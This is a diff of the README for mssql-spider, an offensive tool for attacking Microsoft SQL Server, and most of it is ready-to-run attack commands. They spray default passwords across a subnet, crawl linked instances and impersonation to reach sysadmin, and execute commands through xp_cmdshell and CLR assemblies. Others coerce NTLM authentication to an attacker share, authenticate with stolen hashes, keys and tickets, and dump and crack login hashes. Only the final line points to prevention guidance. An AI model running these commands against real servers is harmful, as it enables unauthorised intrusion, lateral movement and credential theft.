@@ -2,10 +2,10 @@
 
 ![Screenshot](./assets/demo.png)
 
-An improved [impacket-mssqclient](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) that exploits impersonation and linked instances to discover and compromise as many Microsoft SQL Servers as it can reach.
-For example, it can solve the OSEP Lab Challenge 2 automatically.
+An improved [impacket-mssqclient](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) that discovers and exploits as many Microsoft SQL Servers as it can reach by crawling linked instances and abusing user impersonation.
+For example, it can solve the [OSEP](https://www.offensive-security.com/pen300-osep/) Lab Challenge 2 automatically.
 
-Big thanks to the developers of fortra/impacket#1397, [SQLRecon](https://github.com/skahwah/SQLRecon) and [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) on which this project is based.
+Big thanks to the developers of fortra/impacket#1397, [SQLRecon](https://github.com/xforcered/SQLRecon) and [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) on which this project is based.
 
 # Setup
 
@@ -21,112 +21,115 @@ b) With [pip](https://github.com/pypa/pip).
 pip install --user git+https://github.com/dadevel/mssql-spider.git@main
 ~~~
 
-If you want the latest features replace `@main` with `@unstable`.
+If you want the latest features replace `@main` with `@dev`.
 
 # Usage
 
-Authenticate as local user and enumerate recursively.
+Starting from just network access without credentials (classic network pentest), spray known default passwords, abuse user impersonation or linked instances to reach additional servers and execute `whoami` on all servers where you gained *sysadmin* access:
 
 ~~~ bash
-mssql-spider db01.corp.local -u jdoe -p passw0rd
+mapcidr -cidr 192.168.178.0/24 | mssql-ping | tee ./instances.json | mssql-spray passwords -c ./assets/default-credentials.txt | tee ./logins.json | mssql-spider -x 'whoami /all'
 ~~~
 
-Authenticate as domain user via *Pass the Hash* and coerce NTLM authentication from all reachable hosts trough `xp_dirtree`.
+Starting with domain credentials, fetch SPNs of MSSQL servers from BloodHounds database and coerce NTLM authentication from all reachable servers with `xp_dirtree`.
 This does not require privileged access.
 
 ~~~ bash
-mssql-spider ./mssql-servers.txt -d corp.local -u jdoe -H b9f917853e3dbf6e6831ecce60725930 --coerce-dirtree '\\attacker.corp.local\test'
+mssql-discover bloodhound | mssql-ping | tee ./instances.json | mssql-spider -d corp.local -u jdoe -p 'passw0rd' --sysinfo -c '\\192.168.178.128\harvest'
 ~~~
 
-Authenticate via Kerberos and execute a command trough `xp_cmdshell` on all hosts where you can obtain sysadmin privileges.
+All commands switch to JSON input or output if they are used as part of a pipeline.
+You can override this behavior with `--no-json-input` / `--no-json-output`.
 
-~~~ bash
-export KRB5CCNAME=./jdoe.ccache
-mssql-spider db01.corp.local:50123 db02.corp.com:1433 -k -n -x 'whoami /groups'
-~~~
+## Advanced Features
 
-Load and execute a .NET assembly with sysadmin privileges.
+Load and execute a .NET assembly as *sysadmin*.
 The first argument is the path to the DLL.
 The second argument is the name of the function to call.
 All following arguments are passed to the function as `SqlString`.
 The C# code for an exemplary DLL can be found at [SharpProcedure.cs](./extras/SharpProcedure.cs).
 
 ~~~ bash
-mssql-spider db01.corp.local -u jdoe -p passw0rd --exec-clr ./SharpProcedure.dll Run cmd.exe '/c echo %USERNAME%'
+mssql-spider -u sa -p 'passw0rd' -t db01.corp.local --exec-clr ./SharpProcedure.dll Run cmd.exe '/c echo %USERNAME%'
 ~~~
 
-Dump secrets, then crack password hashes of database users with [hashcat](https://github.com/hashcat/hashcat).
+Dump secrets and crack password hashes of database logins with [hashcat](https://github.com/hashcat/hashcat).
 
 ~~~ bash
-mssql-spider db01.corp.local -u jdoe -p passw0rd --dump-hashes --dump-jobs --dump-autologon
+mssql-spider -u sa -p 'passw0rd' -t db01.corp.local --dump-hashes ./hashes.txt --dump-jobs --dump-autologon
 hashcat -O -w 3 -a 0 -m 1731 --username ./hashes.txt ./rockyou.txt
 ~~~
 
-Detailed help:
+Post-process the JSON output with `jq`.
 
-~~~
-positional arguments:
-  HOST[:PORT]|FILE
-
-options:
-  -h, --help                                              show this help message and exit
-  --depth UINT                                            default: 10
-  --threads UINT                                          default: based on CPU cores
-  --timeout SECONDS                                       default: 5
-  --debug                                                 write verbose log to stderr
-
-authentication:
-  -d DOMAIN, --domain DOMAIN                              implies -w
-  -u USERNAME, --user USERNAME
-  -p PASSWORD, --password PASSWORD
-  -n, --no-pass                                           disable password prompt, default: false
-  -H [LMHASH:]NTHASH, --hashes [LMHASH:]NTHASH            authenticate via pass the hash
-  -a HEXKEY, --aes-key HEXKEY                             authenticate with Kerberos key in hex, implies -k
-  -w, --windows-auth                                      use windows instead of local authentication, default: false
-  -k, --kerberos                                          authenticate via Kerberos, implies -w, default: false
-  -K ADDRESS, --dc-ip ADDRESS                             FQDN or IP address of a domain controller, default: value of -d
-  -D NAME, --database NAME
-
-enumeration:
-  -q SQL, --query SQL                                     execute SQL statement, unprivileged, repeatable
-  --sysinfo                                               retrieve database and OS version, unprivileged
-
-coercion:
-  -c UNCPATH, --coerce-dirtree UNCPATH                    coerce NTLM trough xp_dirtree(), unprivileged
-  --coerce-fileexist UNCPATH                              coerce NTLM trough xp_fileexist(), unprivileged
-  --coerce-openrowset UNCPATH                             coerce NTLM trough openrowset(), privileged
-
-filesystem:
-  --file-read REMOTE                                      read file trough openrowset(), privileged
-  --file-write LOCAL REMOTE                               write file trough OLE automation, privileged
-
-execution:
-  -x COMMAND, --exec-cmdshell COMMAND                     execute command trough xp_cmdshell(), privileged
-  --exec-ole COMMAND                                      execute blind command trough OLE automation, privileged
-  --exec-job sql|cmd|powershell|jscript|vbscript COMMAND  execute blind command trough agent job, privileged, experimental!
-  --exec-clr ASSEMBLY FUNCTION [ARGS ...]                 execute .NET DLL, privileged
-
-registry:
-  --reg-read HIVE KEY NAME                                read registry value, privileged, experimental!
-  --reg-write HIVE KEY NAME TYPE VALUE                    write registry value, privileged, experimental!
-  --reg-delete HIVE KEY NAME                              delete registry value, privileged, experimental!
-
-credentials:
-  --dump-hashes                                           extract hashes of database logins, privileged
-  --dump-jobs                                             extract source code of agent jobs, privileged
-  --dump-autologon                                        extract autologon credentials from registry, privileged
+~~~ bash
+mssql-spider -u sa -p 'passw0rd' -t db01.corp.local -x 'whoami /priv' | jq -r 'select(.pwned==true and .result!=null)'
 ~~~
 
-## Usage as library
+## Authentication
 
+As local database user.
+
+~~~ bash
+mssql-spider -u jdoe -p 'passw0rd' -t db01.corp.local
 ~~~
-❯ python3
->>> from mssql_spider.client import MSSQLClient
->>> client = MSSQLClient.connect('192.168.118.140', 1433)
->>> client.login(username='webapp11', password='redacted', windows_auth=False)
->>> client.enum_links()
-{'SQL11\\SQLEXPRESS': {'local_login': 'NULL', 'remote_login': 'NULL'}, 'SQL27': {'local_login': 'webapp11', 'remote_login': 'webappGroup'}, 'SQL53': {'local_login': 'webapp11', 'remote_login': 'testAccount'}}
->>> linked_instance = client.use_rpc_link('SQL27')
->>> linked_instance.whoami()
-{'host': 'sql27', 'login': 'sa', 'user': 'dbo', 'roles': {'db_denydatareader', 'dbcreator', 'db_datareader', 'public', 'db_denydatawriter', 'db_accessadmin', 'setupadmin', 'serveradmin', 'db_backupoperator', 'diskadmin', 'bulkadmin', 'db_owner', 'securityadmin', 'sysadmin', 'db_datawriter', 'processadmin', 'db_ddladmin', 'db_securityadmin'}}
+
+As local windows user.
+
+~~~ bash
+mssql-spider -w -u administrator -p 'passw0rd' -t db01.corp.local
 ~~~
+
+As domain user via NTLM and a password.
+
+~~~ bash
+mssql-spider -d corp.local -u jdoe -p 'passw0rd' -t db01.corp.local
+~~~
+
+As domain user via NTLM *Pass the Hash*.
+
+~~~ bash
+mssql-spider -d corp.local -u jdoe -H b9f917853e3dbf6e6831ecce60725930 -t db01.corp.local
+~~~
+
+As domain user via Kerberos *Overpass the Key*.
+
+~~~ bash
+mssql-spider -d corp.local -u jdoe -H b9f917853e3dbf6e6831ecce60725930 -k -t db01.corp.local
+~~~
+
+As domain user via Kerberos *Pass the Key*.
+
+~~~ bash
+mssql-spider -d corp.local -u jdoe -a c4c283276339e2d6b390eb5a11d419c9 -k -t db01.corp.local
+~~~
+
+As domain user via Kerberos *Pass the Ticket*.
+
+~~~ bash
+export KRB5CCNAME=./jdoe.ccache
+mssql-spider -k -t db01.corp.local
+~~~
+
+# Library Usage
+
+~~~ python
+from mssqlmap.client import Client
+from mssqlmap.connection import Connection
+from mssqlmap.modules.dump import HashDumper
+from mssqlmap.modules.exec import CmdShellExecutor
+from mssqlmap.modules.impersonated_user import ImpersonationSpider
+from mssqlmap.modules.linked_instance import LinkSpider
+
+with Client(Connection(host='db01.corp.local', username='sa', password='passw0rd')) as client:
+    for child, module, status in client.spider([ImpersonationSpider(), LinkSpider()]):
+        print(child, module, status)
+        if status in ('failed', 'denied', 'repeated'):
+            continue
+        for module, result in child.invoke([CmdShellExecutor('whoami /all'), HashDumper('./hashes.txt')]):
+            print(child, module, result)
+~~~
+
+# Prevention and Detection
+
+See [github.com/skahwah/sqlrecon/wiki](https://github.com/xforcered/SQLRecon/wiki/8.-Prevention,-Detection-and-Mitigation-Guidance).
